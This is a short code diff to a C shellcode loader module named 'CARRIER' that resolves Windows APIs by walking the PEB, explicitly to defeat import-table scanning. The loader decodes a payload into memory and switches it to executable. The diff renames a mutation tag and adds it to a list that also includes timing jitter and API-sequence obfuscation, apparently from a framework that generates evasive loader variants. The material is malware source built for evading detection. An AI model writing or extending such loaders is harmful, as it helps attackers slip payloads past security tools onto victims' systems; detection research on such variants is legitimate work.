@@ -1,7 +1,7 @@
 /* MODULE: CARRIER
  * TYPE: peb_walk
  * DESC: Import-free via PEB walking (defeats IAT scanning)
- * MUTATIONS: inline_assembly, string_splitting, loop_restructuring
+ * MUTATIONS: inline_assembly, string_splitting, loop_restructuring, protection_transition
  */
 #include "../header/definitions.h"
 #include "sc_checkpoint.h"
@@ -174,7 +174,7 @@ int carrier() {
     decode_payload(dest, PAYLOAD_LEN);
     // @MUTATE:api_sequence_obfuscation
 
-    // @MUTATE:staged_rx
+    // @MUTATE:protection_transition
     DWORD old;
     if (!myVirtualProtect(dest, PAYLOAD_LEN, p_RX, &old)) return 31;
     // @MUTATE:timing_jitter
